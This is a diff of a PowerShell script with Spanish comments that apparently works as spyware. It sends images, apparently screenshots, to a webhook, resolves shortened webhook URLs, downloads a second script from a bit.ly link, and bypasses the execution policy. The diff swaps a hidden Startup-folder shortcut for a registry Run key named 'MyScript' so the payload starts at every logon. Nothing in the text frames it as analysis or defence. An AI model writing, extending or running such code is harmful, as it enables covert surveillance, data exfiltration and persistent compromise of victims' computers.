@@ -4,7 +4,7 @@ $a = 0 # Contador de imágenes enviadas al webhook
 $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
-if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!c..." ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!!!!!..." ; $hookurl = (irm $hookurl).url}
 
 # Verificar si el archivo principal ya existe
 $syswPath = "$env:USERPROFILE\sysw.ps1"
@@ -21,13 +21,12 @@ Invoke-WebRequest -Uri "https://bit.ly/3HVDrbb" -OutFile $newFilePath
 # Establecer la política de ejecución para el nuevo archivo
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
-# Crear acceso directo en la carpeta de inicio del usuario
-$shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
-if (!(Test-Path $shortcutLocation)) {
-    $targetPath = "powershell.exe"
-    $arguments = "-NoNewWindow -WindowStyle Hidden -File `"$syswPath`""
-    $shortcutContent = "[InternetShortcut]`nURL=$targetPath`nIconFile=$targetPath`nIconIndex=0`nArguments=$arguments"
-    $shortcutContent | Out-File -FilePath $shortcutLocation -Encoding ASCII
+# Agregar entrada al Registro de Windows para ejecutar el script al iniciar sesión
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "MyScript"
+$regValue = $newFilePath
+if (!(Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
+    New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
 }
 
 do {
